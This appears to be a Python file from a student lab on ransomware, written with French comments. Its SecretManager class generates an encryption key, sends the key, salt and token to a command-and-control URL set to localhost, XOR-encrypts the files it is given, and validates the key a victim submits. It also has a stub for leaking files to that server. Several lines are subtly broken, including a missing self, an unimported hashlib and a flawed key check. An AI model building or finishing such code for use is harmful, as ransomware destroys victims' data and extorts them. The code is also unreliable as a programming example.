from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    SALT_LENGTH = 16
    global KEY_LENGTH, TOKEN_LENGTH, fixed_salt
    KEY_LENGTH = 16
    TOKEN_LENGTH = 16
    fixed_salt = secrets.token_bytes(16)

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC( #derivation de la clé comme dans le tp précedent
            algorithm='sha256',
            length=KEY_LENGTH,
            salt=salt,
            iterations=100000
        )
        self._key=kdf.derive(key)
        return self._key 


    def create(self)->Tuple[bytes, bytes, bytes]:
        self.salt = secrets.token_bytes(SALT_LENGTH)
        self.key=secrets.token_bytes(KEY_LENGTH)
        self.key= do_derivation(self.salt, self.key) #hachage de la clé  
        
        self.token=secrets.token_bytes(TOKEN_LENGTH)
        return self.salt, self.key, self.token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:

        payload = {
            "token": self.bin_to_b64(token), #conversion du token, du sel, et de la clé en UTF 8 grace à la foncton #bin_to_64
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        #Url du CNC ici on envoie sur nous même 
        url = "127.0.0.1"   
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("Éléments cryptographiques envoyés avec succès.")
        else:
            print(f"Erreur lors de l'envoi : {response.status_code} - {response.text}")        

    def setup(self)->None:
        salt, key, token=self.create() #création du sel de la clé et du token avec la fonction create
        os.makedirs(self._path, exist_ok=True)#creation du repertoire ici

        with open(os.path.join(self._path, "token.bin"), "wb") as token_file: #on sauvegarde ici le token dans le #fichier alloué
            token_file.write(token)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:#pareil pour le salt
            salt_file.write(salt)

        print(f"Token et salt enregistrés dans le répertoire {self._path}.")

        self.post_new(salt=salt, key=key, token=token)#transmission des données au CNC, on envoie ici avec la méthode post plus haute 

    def load(self)->None:        
        token_path = os.path.join(self._path, "token.bin") #repertoire du token et du salt
        salt_path = os.path.join(self._path, "salt.bin")
        
        if not os.path.isfile(token_path): #On verifie ici que le token existe bien 
            self._log.error(f"Le fichier {token_path} est introuvable.")
            return
        if not os.path.isfile(salt_path): #Pareil ici pour le salt
            self._log.error(f"Le fichier {salt_path} est introuvable.")
            return
        
        with open(token_path, "rb") as token_file: #chargement du token 
            self._token = token_file.read()#on attribue self.token au token enregistré
            self._log.info("Token chargé")
            
        with open(salt_path, "rb") as salt_file: #chargement du salt
            self._salt = salt_file.read()#on attribue self.sal au salt enregistré
            self._log.info("Salt chargé")

        if self._token is None or self._salt is None: #verification du chargement au niveau du token et du salt
            self._log.error("Erreur lors du chargement des données")
            return
            
            

    def check_key(self, candidate_key:bytes)->bool:
    
        try:
            derived_key_victime = self.do_derivation(self._salt, candidate_key)#on derive ici la clé fournie pour la #comparer
            if derived_key_victime == self._key: #si la clé correspond à celle enregistré alors on est bon
                self._log.info("La clé est valide.")
                return True
            else:
                self._log.error("Clé invalide !") #dans le cas contraire on affiche un message d'erreur 
                raise ValueError("Clé incorrecte fournie.")
                return False
        except Exception as e:
            self._log.error(f"Erreur lors de la vérification : {e}")


    def set_key(self, b64_key:str)->None:
        try:
            candidate_key = base64.b64decode(b64_key) #conversion de la clé base 64 en binaire
        except Exception as e:
            self._log.error(f"Erreur de décodage de la clé base64 : {e}")
            raise ValueError("Invalid key")
            
        if self.check_key(candidate_key):#utilisation de check key pour valider ou non la clé de la victime envoyée
            self._key = candidate_key#si la clé est bonne on attribut candidate key à self.key
            self._log.info("Clé définie avec succès.")
        else:
            raise ValueError("Clé incorrecte.")

    def get_hex_token(self)->str:
        if self._token is None:  #On verifie ici l'existence du token 
            self._log.error("Erreur : Token non défini ")
            return ""
        token_hashed = hashlib.sha256(self._token).hexdigest() #calcul du hash du token
        return token_hashed

    def xorfiles(self, files:List[str])->None:
        
        if self._key is None: #veification ici de l'existence de la clé avant de chiffrer si non créer la clé au #préalable
            self._log.error("Clé non définie")
            return

        for file_path in files: #boucle pour parcourir les fichiers
            if os.path.isfile(file_path): #on verifie ici l'existence du fichier 
                try:
                    xorfile(file_path, self._key) #chiffrement avec la methode xorfile importé plus haut, méthode déjà #toute faite
                    self._log.info(f"Fichier chiffré : {file_path}")
                except Exception as e:
                    self._log.info(f"Le fichier n'a pas pu être chiffré{file_path} : {e}")
            else:
                self._log.info(f"fichier introuvable : {file_path}")
        

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        token_path = os.path.join(self._path, "token.bin")#chemin du token et du salt enregistré en local
        salt_path = os.path.join(self._path, "salt.bin")
        
        if os.path.exists(token_path):#On suprrime ici le token 
            os.remove(token_path)
            print(f"{token_path} supprimé avec succès.")
        else:
            print(f"{token_path} introuvable ou déjà supprimé.")

        if os.path.exists(salt_path):# Suppression du fichier salt
            os.remove(salt_path)
            print(f"{salt_path} supprimé avec succès.")
        else:
            print(f"{salt_path} introuvable ou déjà supprimé.")
